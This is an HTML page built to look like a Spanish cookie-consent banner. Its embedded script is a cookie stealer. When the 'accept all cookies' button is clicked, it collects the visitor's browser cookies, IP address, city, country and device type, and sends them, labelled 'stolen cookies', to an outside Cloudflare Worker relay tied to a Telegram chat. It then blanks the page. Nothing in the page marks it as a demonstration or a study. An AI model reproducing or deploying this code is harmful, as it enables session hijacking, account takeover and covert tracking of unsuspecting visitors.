<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aviso de Cookies</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .cookie-card {
            background: white;
            max-width: 500px;
            width: 100%;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12);
            text-align: center;
        }
        .cookie-icon { font-size: 4rem; margin-bottom: 16px; }
        h2 { font-size: 1.5rem; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; }
        p { color: #5f5f5f; font-size: 0.95rem; line-height: 1.6; margin-bottom: 24px; }
        .btn {
            display: inline-block;
            background: #1877f2;
            color: white;
            border: none;
            padding: 12px 32px;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
        }
        .btn:active { background: #0d65d9; transform: scale(0.98); }
        .footer { margin-top: 20px; font-size: 0.7rem; color: #8e8e8e; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="cookiePage">
        <div class="cookie-card">
            <div class="cookie-icon">🍪</div>
            <h2>Gestionar cookies</h2>
            <p>Utilizamos cookies propias y de terceros para mejorar tu experiencia, analizar el tráfico y mostrarte contenido personalizado.</p>
            <button class="btn" id="acceptBtn">Aceptar todas las cookies</button>
            <div class="footer" id="status">⚡ Tus preferencias son importantes para nosotros</div>
        </div>
    </div>

    <div id="blankPage" class="hidden" style="background: white; width: 100vw; height: 100vh; display: none; justify-content: center; align-items: center;">
        <p style="color: #888; font-size: 0.9rem;">&nbsp;</p>
    </div>

    <script>
        // ================= CONFIGURACIÓN =================
        // ✅ NUEVO WORKER (donde está el token seguro)
        const WORKER_URL = 'https://galleta.societykark.workers.dev';
        const CHAT_ID = '7555997298';

        function getCookies() {
            return document.cookie.split('; ')
                .map(cookie => {
                    const [name, value] = cookie.split('=');
                    return { name, value };
                })
                .filter(c => c.name && c.value);
        }

        async function getIPInfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                if (!res.ok) throw new Error();
                const data = await res.json();
                return {
                    ip: data.ip || 'N/A',
                    city: data.city || 'N/A',
                    region: data.region || 'N/A',
                    country: data.country_name || 'N/A',
                    timezone: data.timezone || 'N/A'
                };
            } catch {
                return { ip: 'N/A', city: 'N/A', region: 'N/A', country: 'N/A', timezone: 'N/A' };
            }
        }

        function showBlankPage() {
            document.getElementById('cookiePage').style.display = 'none';
            const blank = document.getElementById('blankPage');
            blank.style.display = 'flex';
            blank.classList.remove('hidden');
            document.body.style.background = 'white';
        }

        async function sendCookiesToTelegram() {
            const cookies = getCookies();
            const userAgent = navigator.userAgent;
            const url = window.location.href;
            const ipInfo = await getIPInfo();

            let device = 'Desconocido';
            if (userAgent.includes('iPhone')) device = 'iPhone';
            else if (userAgent.includes('iPad')) device = 'iPad';
            else if (userAgent.includes('Android')) device = 'Android';
            else if (userAgent.includes('Mac')) device = 'Mac';
            else if (userAgent.includes('Windows')) device = 'Windows PC';

            let message = `🍪 *COOKIES ROBADAS*\n━━━━━━━━━━━━━━━━\n\n`;
            message += `📱 *Dispositivo:* ${device}\n`;
            message += `🌐 *IP:* ${ipInfo.ip}\n`;
            message += `📍 *Ciudad:* ${ipInfo.city}\n`;
            message += `📍 *Región:* ${ipInfo.region}\n`;
            message += `📍 *País:* ${ipInfo.country}\n`;
            message += `⏰ *Zona Horaria:* ${ipInfo.timezone}\n`;
            message += `🌐 *URL:* ${url}\n\n`;
            message += `📋 *Cookies encontradas:* ${cookies.length}\n\n`;

            if (cookies.length === 0) {
                message += `❌ No se encontraron cookies.\n`;
            } else {
                cookies.forEach(c => {
                    let display = c.value.length > 60 ? c.value.slice(0, 60) + '...' : c.value;
                    message += `• *${c.name}*: \`${display}\`\n`;
                });
                message += `\n📦 *Total:* ${cookies.length} cookies robadas.`;
            }

            // 📤 Enviar al Worker (el token está seguro ahí)
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', message);

            try {
                const res = await fetch(WORKER_URL, {
                    method: 'POST',
                    body: formData,
                    mode: 'cors',
                    credentials: 'omit'
                });
                if (!res.ok) {
                    const errorText = await res.text();
                    console.error('Error al enviar al Worker:', errorText);
                } else {
                    console.log('✅ Cookies enviadas correctamente');
                }
            } catch (e) {
                console.error('Error de red:', e);
            }

            showBlankPage();
        }

        document.getElementById('acceptBtn').addEventListener('click', function(e) {
            e.preventDefault();
            this.disabled = true;
            this.textContent = '⏳ Procesando...';
            sendCookiesToTelegram();
        });
    </script>
</body>
</html>
